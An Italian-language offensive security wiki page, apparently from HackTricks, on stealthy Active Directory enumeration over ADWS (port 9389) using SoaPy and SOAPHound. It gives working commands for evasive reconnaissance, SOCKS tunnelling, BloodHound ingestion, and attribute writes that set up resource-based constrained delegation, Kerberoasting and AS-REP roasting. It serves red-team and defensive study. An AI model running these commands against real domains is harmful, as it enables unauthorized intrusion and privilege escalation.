# Active Directory Web Services (ADWS) Enumerazione & raccolta stealth

{{#include ../../banners/hacktricks-training.md}}

## Che cos'è ADWS?

Active Directory Web Services (ADWS) è **abilitato di default su ogni Domain Controller a partire da Windows Server 2008 R2** e ascolta sulla porta TCP **9389**. Nonostante il nome, **non è coinvolto HTTP**. Invece, il servizio espone dati in stile LDAP tramite una pila di protocolli di framing proprietari .NET:

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

Poiché il traffico è incapsulato all'interno di questi frame SOAP binari e viaggia su una porta non comune, **l'enumerazione via ADWS ha molte meno probabilità di essere ispezionata, filtrata o rilevata rispetto al classico traffico LDAP/389 & 636**. Per gli operatori questo significa:

* Ricognizione più stealth — i Blue team spesso si concentrano sulle query LDAP.
* Libertà di raccogliere da **host non-Windows (Linux, macOS)** tunnelizzando 9389/TCP attraverso un proxy SOCKS.
* Gli stessi dati che otterresti via LDAP (utenti, gruppi, ACL, schema, ecc.) e la possibilità di effettuare **scritture** (es. `msDs-AllowedToActOnBehalfOfOtherIdentity` per **RBCD**).

Le interazioni ADWS sono implementate su WS-Enumeration: ogni query inizia con un messaggio `Enumerate` che definisce il filtro/attributi LDAP e restituisce un GUID `EnumerationContext`, seguito da uno o più messaggi `Pull` che streammano fino alla finestra di risultati definita dal server. I contesti scadono dopo ~30 minuti, quindi gli strumenti devono fare paging dei risultati o suddividere i filtri (query per prefisso su CN) per evitare di perdere lo stato. Quando si richiedono security descriptor, specificare il controllo `LDAP_SERVER_SD_FLAGS_OID` per omettere le SACL; altrimenti ADWS semplicemente rimuove l'attributo `nTSecurityDescriptor` dalla sua risposta SOAP.

> NOTE: ADWS è anche utilizzato da molti tool RSAT GUI/PowerShell, quindi il traffico può confondersi con attività amministrative legittime.

## SoaPy – Native Python Client

[SoaPy](https://github.com/logangoins/soapy) è una **reimplementazione completa dello stack di protocolli ADWS in puro Python**. Costruisce i frame NBFX/NBFSE/NNS/NMF byte-per-byte, permettendo la raccolta da sistemi Unix-like senza toccare il runtime .NET.

### Key Features

* Supports **proxying through SOCKS** (useful from C2 implants).
* Filtri di ricerca granulare identici a LDAP `-q '(objectClass=user)'`.
* Operazioni opzionali di **scrittura** ( `--set` / `--delete` ).
* **BOFHound output mode** per ingestione diretta in BloodHound.
* Flag `--parse` per migliorare la leggibilità di timestamp / `userAccountControl` quando è richiesta la lettura umana.

### Targeted collection flags & write operations

SoaPy include switch curati che replicano i task di hunting LDAP più comuni su ADWS: `--users`, `--computers`, `--groups`, `--spns`, `--asreproastable`, `--admins`, `--constrained`, `--unconstrained`, `--rbcds`, oltre ai knob grezzi `--query` / `--filter` per pull personalizzati. Abbinali a primitive di scrittura come `--rbcd <source>` (imposta `msDs-AllowedToActOnBehalfOfOtherIdentity`), `--spn <service/cn>` (SPN staging per Kerberoasting mirato) e `--asrep` (capovolge `DONT_REQ_PREAUTH` in `userAccountControl`).

Esempio di ricerca SPN mirata che restituisce solo `samAccountName` e `servicePrincipalName`:
```bash
soapy corp.local/alice:'Winter2025!'@dc01.corp.local \
--spns -f samAccountName,servicePrincipalName --parse
```
Usa lo stesso host/credenziali per sfruttare immediatamente i risultati: esegui il dump degli oggetti RBCD-capable con `--rbcds`, quindi applica `--rbcd 'WEBSRV01$' --account 'FILE01$'` per allestire una catena Resource-Based Constrained Delegation (vedi [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md) per il percorso completo di abuso).

### Installazione (host operatore)
```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```
## SOAPHound – Raccolta ADWS ad alto volume (Windows)

[FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound) è un collector .NET che mantiene tutte le interazioni LDAP all'interno di ADWS e produce JSON compatibile con BloodHound v4. Costruisce una cache completa di `objectSid`, `objectGUID`, `distinguishedName` e `objectClass` una sola volta (`--buildcache`), quindi la riutilizza per passaggi ad alto volume `--bhdump`, `--certdump` (ADCS), o `--dnsdump` (DNS integrato in AD) in modo che solo ~35 attributi critici escano mai dal DC. AutoSplit (`--autosplit --threshold <N>`) frammenta automaticamente le query per prefisso CN per rimanere sotto il timeout EnumerationContext di 30 minuti nelle foreste di grandi dimensioni.

Flusso di lavoro tipico su una VM dell'operatore unita al dominio:
```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump \
--autosplit --threshold 1200 --nolaps \
-o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```
JSON esportati direttamente nei workflow SharpHound/BloodHound—see [BloodHound methodology](bloodhound.md) for downstream graphing ideas. AutoSplit rende SOAPHound resistente su foreste con milioni di oggetti mantenendo il numero di query inferiore rispetto agli snapshot in stile ADExplorer.

## Flusso stealth di raccolta AD

Il seguente workflow mostra come enumerare **oggetti del dominio & ADCS** tramite ADWS, convertirli in BloodHound JSON e cercare percorsi d'attacco basati su certificati – il tutto da Linux:

1. **Tunnel 9389/TCP** dalla rete target alla tua macchina (es. via Chisel, Meterpreter, SSH dynamic port-forward, ecc.).  Export `export HTTPS_PROXY=socks5://127.0.0.1:1080` or use SoaPy’s `--proxyHost/--proxyPort`.

2. **Collect the root domain object:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-q '(objectClass=domain)' \
| tee data/domain.log
```
3. **Raccogli oggetti relativi ad ADCS dalla Configuration NC:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-dn 'CN=Configuration,DC=ludus,DC=domain' \
-q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
| tee data/adcs.log
```
4. **Converti in BloodHound:**
```bash
bofhound -i data --zip   # produces BloodHound.zip
```
5. **Carica lo ZIP** nella BloodHound GUI ed esegui query cypher come `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c` per rivelare percorsi di escalation dei certificati (ESC1, ESC8, ecc.).

### Scrittura di `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD)
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
--set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```
Combina questo con `s4u2proxy`/`Rubeus /getticket` per una catena completa di **Resource-Based Constrained Delegation** (vedi [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)).

## Riepilogo strumenti

| Scopo | Strumento | Note |
|---------|------|-------|
| Enumerazione ADWS | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, read/write |
| Dump ADWS ad alto volume | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET, cache-first, BH/ADCS/DNS modes |
| Importazione in BloodHound | [BOFHound](https://github.com/bohops/BOFHound) | Converte i log di SoaPy/ldapsearch |
| Compromissione certificati | [Certipy](https://github.com/ly4k/Certipy) | Può essere instradato attraverso lo stesso SOCKS |

## Riferimenti

* [SpecterOps – Make Sure to Use SOAP(y) – An Operators Guide to Stealthy AD Collection Using ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
* [SoaPy GitHub](https://github.com/logangoins/soapy)
* [BOFHound GitHub](https://github.com/bohops/BOFHound)
* [Microsoft – MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF specifications](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
* [IBM X-Force Red – Stealthy Enumeration of Active Directory Environments Through ADWS](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
* [FalconForce – SOAPHound tool to collect Active Directory data via ADWS](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)

{{#include ../../banners/hacktricks-training.md}}
